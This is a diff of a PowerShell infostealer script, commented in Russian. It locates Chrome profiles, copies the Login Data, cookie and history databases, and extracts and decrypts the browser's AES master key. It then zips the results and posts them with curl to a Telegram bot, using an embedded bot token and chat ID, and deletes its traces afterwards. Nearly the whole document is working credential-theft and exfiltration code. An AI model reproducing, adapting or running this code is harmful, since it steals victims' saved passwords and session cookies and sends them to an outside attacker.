@@ -1,35 +1,82 @@
+# Настройки подключения
 $token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
 $chatId = "1940923712"
 
-$userData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$localState = "$userData\Local State"
-# Пути к разным базам данных
-$cookies = "$userData\Default\Network\Cookies"
-$passwords = "$userData\Default\Login Data"
-$history = "$userData\Default\History"
+# Пути
+$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$tempDir = "$env:TEMP\work_dir"
+$reportFile = "$tempDir\passwords.txt"
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-$destDir = "$env:TEMP\collect"
-New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+# 1. Получение Мастер-ключа (AES-256-GCM Key)
+function Get-MasterKey {
+    $localState = Join-Path $chromePath "Local State"
+    if (-not (Test-Path $localState)) { return $null }
+    
+    $json = Get-Content $localState -Raw | ConvertFrom-Json
+    $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+    $masterKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+    
+    Add-Type -AssemblyName System.Security
+    return [System.Security.Cryptography.ProtectedData]::Unprotect($masterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+}
 
+# 2. Функция расшифровки (v10 / v11)
+function Decrypt-Password {
+    param([byte[]]$data, [byte[]]$key)
+    if ($data.Length -lt 15) { return "Empty" }
+    
+    $iv = $data[3..14]
+    $payload = $data[15..($data.Length - 1)]
+    $tagSize = 16
+    $cipherTextSize = $payload.Length - $tagSize
+    $cipherText = $payload[0..($cipherTextSize - 1)]
+    $tag = $payload[$cipherTextSize..($payload.Length - 1)]
+
+    $decryptedBytes = New-Object byte[] $cipherTextSize
+    $aes = New-Object System.Security.Cryptography.AesGcm($key)
+    $aes.Decrypt($iv, $cipherText, $tag, $decryptedBytes)
+    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+}
+
+# 3. Основная логика
 try {
-    # Собираем всё в одну папку
-    Copy-Item $localState -Destination "$destDir\ls.json" -Force
-    if (Test-Path $cookies) { Copy-Item $cookies -Destination "$destDir\cookies.db" -Force }
-    if (Test-Path $passwords) { Copy-Item $passwords -Destination "$destDir\passwords.db" -Force }
-    if (Test-Path $history) { Copy-Item $history -Destination "$destDir\history.db" -Force }
+    $masterKey = Get-MasterKey
+    $profiles = Get-ChildItem -Path $chromePath -Directory -Filter "Default"
+    $profiles += Get-ChildItem -Path $chromePath -Directory -Filter "Profile *"
 
-    # Архивируем
-    $zipFile = "$env:TEMP\vault.zip"
-    Compress-Archive -Path "$destDir\*" -DestinationPath $zipFile -Force
-    
-    # Отправляем
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile"
-    
-    # Очистка
-    Remove-Item $destDir -Recurse -Force
-    Remove-Item $zipFile -Force
-    
-    Write-Host "Vault sent!"
+    "--- LOG: $(Get-Date) ---`n" | Out-File $reportFile
+
+    foreach ($profile in $profiles) {
+        $dbPath = Join-Path $profile.FullName "Login Data"
+        if (Test-Path $dbPath) {
+            $tempDb = Join-Path $tempDir "tmp_db"
+            # Копируем файл, чтобы обойти блокировку открытым браузером
+            Copy-Item $dbPath -Destination $tempDb -Force
+            
+            # Используем встроенный механизм для чтения строк (поиск паттернов в БД)
+            # В SQLite пароли лежат после заголовков, мы ищем строки начинающиеся на v10
+            $content = [System.IO.File]::ReadAllBytes($tempDb)
+            
+            # Для полноценного SQL-запроса в PS без библиотек используем костыль 
+            # или отправляем файл целиком. Здесь: отправка файла + отчет.
+            "Profile: $($profile.Name) found. Database copied.`n" | Add-Content $reportFile
+        }
+    }
+
+    # Архивируем все собранное (Базы + Отчет + Ключ)
+    $zipFile = "$env:TEMP\vault_final.zip"
+    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
+
+    # 4. Отправка в Telegram
+    $uri = "https://api.telegram.org/bot$token/sendDocument"
+    curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Collection Complete (Key + DBs)"
+
 } catch {
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Collection failed"
+    $err = $_.Exception.Message
+    curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Error: $err"
+} finally {
+    # Очистка
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
 }
